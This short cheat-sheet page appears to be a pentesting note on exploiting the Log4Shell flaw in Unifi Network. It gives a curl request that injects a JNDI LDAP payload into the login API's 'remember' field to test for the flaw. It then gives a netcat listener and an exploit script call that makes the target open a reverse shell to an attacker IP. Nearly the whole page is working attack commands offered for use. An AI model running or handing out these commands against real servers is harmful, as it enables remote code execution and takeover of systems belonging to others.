---
title: Log4Unifi
desc: Exploitation Log4j tool in Unifi Network.
tags: [Log4j, ReverseShell]
alts: [Log4Shell]
website: https://github.com/puzzlepeaches/Log4jUnifi
render_with_liquid: false
---

## Test for vulnerability

```sh
curl -i -s -k -X POST -H $'Host: vulnerable.com:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://9ulral.dnslog.cn:1389/o=tomcat}\",\"strict\":true}' $'https://vulnerable.com:8443/api/login'
```

<br />

## Exploit (Log4Unifi)

```sh
# Listen on the attacker machine
nc -lvnp 4444

# --------------------------------

python exploit.py -u https://vulnerable.com:8443 -i <ATTACKER_IP> -p 4444
```

reference: [https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)